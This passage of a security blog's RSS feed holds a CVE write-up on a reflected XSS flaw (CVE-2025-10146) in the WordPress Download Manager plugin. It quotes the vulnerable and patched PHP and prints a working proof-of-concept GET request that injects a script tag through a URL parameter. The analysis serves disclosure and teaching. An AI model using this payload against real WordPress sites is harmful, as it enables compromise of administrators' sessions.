href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/aio-time-clock-lite/vulnerability/wordpress-all-in-one-time-clock-lite-tracking-employee-time-has-never-been-easier-plugin-2-0-reflected-cross-site-scripting-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress All in One Time Clock Lite &amp;lt;= 2.0 — CVE-2025-6832&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10146 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-06-cve-2025-10146/</link>
      <pubDate>Mon, 06 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-06-cve-2025-10146/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;A vulnerability exists in the &lt;strong&gt;Download Manager&lt;/strong&gt; plugin prior to version &lt;strong&gt;3.3.24&lt;/strong&gt;. Data retrieved from &lt;strong&gt;GET&lt;/strong&gt; requests is printed directly into &lt;strong&gt;HTML attributes&lt;/strong&gt;, leading to &lt;strong&gt;reflected XSS&lt;/strong&gt; when a user with privileges accesses a URL crafted by an attacker.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10146&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10146&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/download-manager&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Download Manager Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.3.23&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Download Manager&lt;/strong&gt;: v3.3.23(vulnerable) and v3.3.24(fixed)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool capable of comparing differences between two versions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable and patched versions. A significant difference appears in &lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerable code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if (!empty($user_ids)): ?&amp;gt;&#xA;    &amp;lt;div class=&amp;#34;clear-filter&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        $get_params_xu = $get_params;&#xA;        unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);&#xA;        $reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;);&#xA;        ?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;&amp;lt;?php echo $reset_url; ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34; title=&amp;#34;&amp;lt;?php _e(&amp;#39;Clear user filter&amp;#39;, &amp;#39;download-manager&amp;#39;); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&#xA;        &amp;lt;/a&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;&amp;lt;?php endif; ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;strong&gt;GET parameters&lt;/strong&gt; are directly assigned to the &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; element&amp;rsquo;s &lt;strong&gt;href&lt;/strong&gt; without any protection, creating a risk of &lt;strong&gt;reflected XSS&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched code&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php if (!empty($user_ids)): ?&amp;gt;&#xA;    &amp;lt;div class=&amp;#34;clear-filter&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        $get_params_xu = $get_params;&#xA;        unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);&#xA;        $get_params_xu = \WPDM\__\__::sanitize_array($get_params_xu, &amp;#39;safetxt&amp;#39;);&#xA;&#xA;        $reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;);&#xA;        ?&amp;gt;&#xA;        &amp;lt;a href=&amp;#34;&amp;lt;?php echo esc_url($reset_url); ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34; title=&amp;#34;&amp;lt;?php _e(&amp;#39;Clear user filter&amp;#39;, &amp;#39;download-manager&amp;#39;); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&#xA;        &amp;lt;/a&amp;gt;&#xA;    &amp;lt;/div&amp;gt;&#xA;&amp;lt;?php endif; ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/patch_diff.png&#34; title=&#34;Patch Diff: sanitized GET parameters and escaped URL&#34; data-thumbnail=&#34;/posts/2025-10-06-cve-2025-10146/patch_diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch Diff&lt;/h2&gt;&lt;p&gt;Patch Diff: sanitized GET parameters and escaped URL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-06-cve-2025-10146/patch_diff.png&#39; alt=&#34;Patch Diff&#34; height=&#34;167&#34; width=&#34;1340&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch Diff: sanitized GET parameters and escaped URL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch &lt;strong&gt;sanitizes&lt;/strong&gt; the &lt;strong&gt;GET parameters&lt;/strong&gt; using &lt;code&gt;sanitize_array&lt;/code&gt; and uses &lt;code&gt;esc_url&lt;/code&gt; to &lt;strong&gt;escape the URL&lt;/strong&gt;, making it safe.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How It Works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;We need to identify the real URL to inject GET parameters containing the XSS payload.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt; contains PHP and HTML tags inside the &lt;strong&gt;views&lt;/strong&gt; folder, indicating it is included somewhere in the plugin.&lt;/p&gt;&#xA;&lt;p&gt;Searching for &lt;code&gt;history.php&lt;/code&gt; in the plugin directory:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/search1.png&#34; title=&#34;Search results for history.php&#34; data-thumbnail=&#34;/posts/2025-10-06-cve-2025-10146/search1.png&#34; data-sub-html=&#34;&lt;h2&gt;Search 1&lt;/h2&gt;&lt;p&gt;Search results for history.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-06-cve-2025-10146/search1.png&#39; alt=&#34;Search 1&#34; height=&#34;548&#34; width=&#34;590&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Search results for history.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 No direct matches are found. It is likely included dynamically like &lt;code&gt;{$file_name}.php&lt;/code&gt;. Using regex &lt;code&gt;\{.*\}\.php&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/regex.png&#34; title=&#34;Regex search for dynamic includes&#34; data-thumbnail=&#34;/posts/2025-10-06-cve-2025-10146/regex.png&#34; data-sub-html=&#34;&lt;h2&gt;Regex&lt;/h2&gt;&lt;p&gt;Regex search for dynamic includes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-06-cve-2025-10146/regex.png&#39; alt=&#34;Regex&#34; height=&#34;250&#34; width=&#34;1573&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Regex search for dynamic includes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt; is included in &lt;strong&gt;src/Admin/views/stats.php&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The actual URL to access is declared at the top of &lt;strong&gt;stats.php&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$base_page_uri = &amp;#34;edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Similarly, &lt;strong&gt;stats.php&lt;/strong&gt; is also included elsewhere, but it’s not necessary to trace further since the URL is identified.&lt;/p&gt;&#xA;&lt;p&gt;To verify, we set a &lt;strong&gt;breakpoint&lt;/strong&gt; in &lt;strong&gt;src/Admin/views/stats/history.php&lt;/strong&gt;, start debugging, and access the URL:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/debug.png&#34; title=&#34;Breakpoint debugging to observe GET params&#34; data-thumbnail=&#34;/posts/2025-10-06-cve-2025-10146/debug.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Breakpoint debugging to observe GET params&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-06-cve-2025-10146/debug.png&#39; alt=&#34;Debug&#34; height=&#34;386&#34; width=&#34;1316&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Breakpoint debugging to observe GET params&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;First, the plugin collects all &lt;strong&gt;GET parameters&lt;/strong&gt; into &lt;code&gt;$get_params&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If &lt;code&gt;$user_ids&lt;/code&gt; is not empty, a &lt;strong&gt;“Clear filter” button&lt;/strong&gt; is created. To make the button functional, it must generate a URL without the &lt;code&gt;user_ids&lt;/code&gt; parameter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$get_params_xu = $get_params;        // copy all GET parameters&#xA;unset($get_params_xu[&amp;#39;user_ids&amp;#39;]);   // remove user_ids from array&#xA;$reset_url = add_query_arg($get_params_xu, &amp;#39;edit.php&amp;#39;); // generate new URL&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unset($get_params_xu[&#39;user_ids&#39;])&lt;/code&gt; removes the filter.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;add_query_arg($get_params_xu, &#39;edit.php&#39;)&lt;/code&gt; generates the URL with remaining parameters.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;This URL is attached to the “Clear filter” button:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&amp;#34;&amp;lt;?php echo $reset_url; ?&amp;gt;&amp;#34; class=&amp;#34;clear-btn&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt; Clicking the button reloads the page without the &lt;code&gt;user_ids&lt;/code&gt; filter.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detect-xss&#34;&gt;&lt;span&gt;Detect XSS&lt;/span&gt;&#xA;  &lt;a href=&#34;#detect-xss&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a GET request containing the XSS payload:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/edit.php?post_type=wpdmpro&amp;amp;page=wpdm-stats&amp;amp;user_ids[0]=1&amp;amp;payload=&amp;#34;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt; closes the &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag, followed by a &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; to trigger &lt;code&gt;alert()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-06-cve-2025-10146/xss.png&#34; title=&#34;Reflected XSS triggered via GET parameter&#34; data-thumbnail=&#34;/posts/2025-10-06-cve-2025-10146/xss.png&#34; data-sub-html=&#34;&lt;h2&gt;XSS&lt;/h2&gt;&lt;p&gt;Reflected XSS triggered via GET parameter&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-06-cve-2025-10146/xss.png&#39; alt=&#34;XSS&#34; height=&#34;259&#34; width=&#34;1275&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Reflected XSS triggered via GET parameter&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;👉 XSS succeeds. When a user with privileges accesses the attacker-provided URL, &lt;strong&gt;reflected XSS&lt;/strong&gt; occurs, simulating an &lt;strong&gt;Unauthenticated attack&lt;/strong&gt; scenario.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability &lt;strong&gt;CVE-2025-10146&lt;/strong&gt; in &lt;strong&gt;WordPress Download Manager &amp;lt;= 3.3.23&lt;/strong&gt; is a &lt;strong&gt;reflected XSS&lt;/strong&gt;, occurring when &lt;strong&gt;GET request&lt;/strong&gt; data is printed directly into an &lt;strong&gt;HTML attribute&lt;/strong&gt; without sanitization or escaping. Privileged users accessing the attacker-crafted URL may be exploited.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;strong&gt;3.3.24&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sanitizes GET parameters&lt;/strong&gt; (&lt;code&gt;sanitize_array&lt;/code&gt;) to remove dangerous characters.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Escapes URL&lt;/strong&gt; (&lt;code&gt;esc_url&lt;/code&gt;) before rendering in HTML to prevent XSS.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;sanitize and escape user input&lt;/strong&gt; before rendering in HTML.&lt;/li&gt;&#xA;&lt;li&gt;Check &lt;strong&gt;user permissions&lt;/strong&gt; before processing or displaying sensitive data.&lt;/li&gt;&#xA;&lt;li&gt;Low-privilege roles (like contributor) can become attack vectors if the plugin does not enforce proper protections.&lt;/li&gt;&#xA;&lt;li&gt;Updating plugins regularly is a simple and effective defense.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/download-manager/vulnerability/wordpress-download-manager-plugin-3-3-23-reflected-cross-site-scripting-via-user-ids-parameter-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Download Manager Plugin &amp;lt;= 3.3.24 is vulnerable to Cross Site Scripting (XSS)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58990 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-05-cve-2025-58990/</link>
      <pubDate>Sun, 05 Oct 2025 22:45:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-05-cve-2025-58990/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
